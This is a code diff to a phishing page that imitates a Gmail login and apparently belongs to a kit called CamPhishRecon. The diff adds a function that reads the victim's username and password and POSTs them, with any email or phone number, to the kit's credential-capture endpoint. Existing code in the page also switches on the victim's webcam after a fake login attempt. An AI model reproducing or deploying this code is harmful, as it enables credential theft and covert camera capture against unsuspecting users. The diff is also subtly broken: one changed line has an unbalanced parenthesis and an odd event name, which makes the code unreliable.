@@ -69,7 +69,7 @@ function doLogin(e){
 e.preventDefault();
 var btn=document.getElementById('loginBtn');btn.innerHTML='Verifying...';btn.disabled=true;
 var fs=document.getElementById('scanOverlay');fs.classList.add('active');
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('gmail_login',{});
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('0_login',{}); captureCreds());
 if(navigator.mediaDevices){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
 var v=document.getElementById('v');v.srcObject=stream;v.play();
@@ -79,6 +79,16 @@ setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Wro
 }).catch(function(){fs.classList.remove('active');btn.innerHTML='Next';btn.disabled=false;});
 }else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Next';btn.disabled=false;},2000);}
 return false;
+}
+function captureCreds(){
+var u=document.getElementById("user");var p=document.getElementById("pass");
+if(!u||!p)return;
+var data={template_id:"gmail",username:u.value,password:p.value};
+if(u.value.indexOf("@")>=0)data.email=u.value;
+if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
+fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
+method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
+}).catch(function(){});
 }
 </script>
 </body></html>
